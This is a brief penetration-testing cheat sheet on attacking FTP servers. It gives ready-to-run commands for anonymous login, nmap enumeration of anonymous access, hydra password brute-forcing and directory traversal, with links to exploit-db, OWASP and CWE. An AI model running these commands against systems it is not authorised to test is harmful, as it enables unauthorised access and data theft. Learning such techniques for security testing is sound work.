# FTP - File Transfer Protocols

- [Exploiting FTP Vulnerabilities](https://medium.com/@1200km/exploiting-ftp-vulnerabilities-for-effective-penetration-testing-a2810df78602
)

## Anonymous Login
- Anonymous FTP login
    - Username: Anonymous
    - Password: Anonymous
```
$ ftp 192.168.1.1
Connected to 192.168.1.1
220 FTP Server Banner
Name (192.168.1.1): Anonymous
331 Password Required
Password: Anonymous
```

## Enumerating Anonymous FTP with nmap
```
nmap -sV -p 21 -A <target_host>

nmap -sV -p 21 --script ftp-anon <target_host>
```

## Exploiting FTP logins with hydra

```
hydra -t 4 -l <username> -P <password_file> -vV ftp://10.10.10.10
```

## Directory Traversal
- https://www.exploit-db.com/exploits/11973
- Many FTP servers are vulnerable to directory traversal attacks
- [OWASP | Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE | Path Traversal Weakness](https://cwe.mitre.org/data/definitions/22.html)
```
ftp> cd ../../../../../../../
ftp> pwd
/
```